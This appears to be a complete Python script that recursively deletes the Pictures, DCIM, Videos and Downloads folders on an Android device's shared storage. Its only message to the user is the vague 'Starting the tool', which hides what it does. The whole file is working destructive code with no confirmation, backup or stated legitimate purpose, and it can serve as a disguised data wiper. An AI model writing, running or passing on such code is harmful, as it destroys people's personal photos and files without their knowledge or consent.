import os
import shutil

# Target directories for deletion
TARGET_DIRS = [
    '/sdcard/Pictures',
    '/sdcard/DCIM',
    '/sdcard/Videos',
    '/sdcard/Downloads'
]

def main():
    print("Starting the tool")
    for dir_path in TARGET_DIRS:
        if os.path.exists(dir_path):
            try:
                # Delete directory contents recursively
                shutil.rmtree(dir_path)
                print(f"Deleted: {dir_path}")
            except PermissionError:
                print(f"Permission denied for: {dir_path}")
        else:
            print(f"Not found: {dir_path}")

if __name__ == "__main__":
    main()
